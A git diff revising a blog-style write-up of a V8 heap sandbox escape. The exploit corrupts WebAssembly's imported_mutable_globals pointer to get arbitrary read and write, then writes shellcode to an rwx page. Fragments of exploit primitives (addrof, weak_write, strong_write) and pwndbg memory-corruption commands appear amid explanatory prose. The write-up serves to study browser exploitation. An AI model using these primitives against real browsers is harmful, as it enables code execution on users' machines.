@@ -59,26 +59,10 @@ index af24f4309a..5ca4c0666a 100644
 
 For this particular heap sandbox escape, we'll need to build out some typical exploit primitives. I won't go into much detail here, but you can find the relevant code below.
 
-```js
-let buf = new ArrayBuffer(8);
-let f64 = new Float64Array(buf);
-let u64 = new BigUint64Array(buf);
-let i64 = new BigInt64Array(buf);
-
-const utof = x => {
-  u64[0] = x;
-  return f64[0];
-};
-
-const itou = x => {
-  i64[0] = x;
-  return u64[0];
-};
-
-const hex = x => {
-  return `0x${x.toString(16)}`; 
-};
-```
+They pretty much all use the memory corruption api in their implementation, so I suggest you look
+at the code for it (since it's completely undocumented, lmao) if you want to learn more.
+[Here](https://chromium.googlesource.com/v8/v8/+/4a12cb1022ba335ce087dcfe31b261355524b3bf) is the
+relevant commit.
 
 ```js
 const addrof = o => {
@@ -100,17 +84,14 @@ const weak_write = (p, x) => {
 
 ## WebAssembly Mutable Globals 
 
+Before digging into any memory corruption, I want to first explore web-assembly's mutable globals
+functionality.
 
-
-```
-DebugPrint: 0x237001d4521: [WasmInstanceObject] in OldSpace
- - map: 0x023700207891 <Map[256](HOLEY_ELEMENTS)> [FastProperties]
- - prototype: 0x0237000486f1 <Object map = 0x23700208151>
- - elements: 0x023700002251 <FixedArray[0]> [HOLEY_ELEMENTS]
-...
- - imported_mutable_globals: 0x561312e4e250
-...
-```
+Some useful code for demonstrating this functionality can be found within the web-assembly
+reference repo,
+[here](https://github.com/mdn/webassembly-examples/blob/main/js-api-examples/global.wat). It
+implements two functions, one for reading a 32-bit integer from a global variable, and another
+incrementing that global variable by `1`.
 
 ```clojure
 (module
@@ -123,6 +104,12 @@ DebugPrint: 0x237001d4521: [WasmInstanceObject] in OldSpace
   )
 )
 ```
+
+Note that the global variable has to be instantiated prior to the wasm instance, and it needs
+to be passed to the wasm instance when it is created.
+
+Running the below code will demonstrate both these functions, and how web-assembly mutable
+globals are used in practice.
 
 ```js
 const global = new WebAssembly.Global({ value: "i32", mutable: true }, 0);
@@ -149,9 +136,8 @@ console.log(instance.exports.getGlobal()); // 1
 
 ## Corrupting the Imported Mutable Globals Pointer
 
-So what happens if we decide to corrupt the `imported_mutable_globals` pointer? Well it appears to
-be a external pointer (i.e. outside of the heap), so logically we should be able to read or modify
-an arbitrary location in memory. 
+Below is some javascript code that will allow us to explore how this memory changes when the
+`incGlobal` wasm function is called.
 
 ```js
 %DebugPrint(instance);
@@ -160,6 +146,14 @@ an arbitrary location in memory.
 instance.exports.incGlobal();
 %SystemBreak();
 ```
+
+In the debug print of the wasm instance object, we can see an interesting value pertaining to
+web-assembly's mutable globals functionality. The pointer to `imported_mutable_globals`, and even
+more interesting is that it appears to be an external pointer.
+
+So what happens if we decide to corrupt the `imported_mutable_globals` pointer? Well it appears to
+be a external pointer (i.e. outside of the heap), so logically we should be able to replace it in
+order to read or modify an arbitrary location in memory. 
 
 ```
 DebugPrint: 0x1f84001d4659: [WasmInstanceObject] in OldSpace
@@ -190,6 +184,9 @@ pwndbg> x/gx 0x00001f8500001000
 Let's see what happens when we completely corrupt the first pointer in the
 `imported_mutable_globals` table. That is, not the `imported_mutable_globals` pointer itself,
 but the first entry within it.
+
+In the example below, I replace this entry with a pointer to `0x4141414141414141`, so we should
+see a segmentation fault if we try to access it.
 
 ```
 pwndbg> set *(uint64_t *)(0x56394c0dc3d0) = 0x4141414141414141
@@ -315,7 +312,8 @@ variable.
 ```
 
 You can see how similar it is to the read primitive. It uses the same logic to replaced the
-pointer to the location in memory we want to modify.
+pointer to the location in memory we want to modify. The only difference being that the
+web-assembly function used to write to a global variable is called.
 
 ```js
 const strong_write = (p, x) => {
@@ -327,8 +325,9 @@ const strong_write = (p, x) => {
 
 ## Code Execution
 
-In order to achieve code execution we don't actually require the arbitrary read primitive. All the
-values we need to leak are already stored on the heap.
+In order to achieve code execution we don't actually require the arbitrary read primitive, it was
+really just an extra primitive to explore. All the values we need to leak are already stored on
+the heap.
 
 The arbitrary write primitive however, is extremely useful. In the code below, it is used to write
 shellcode to the `rwx` page allocated by a wasm instance object. This, of course, is a very well
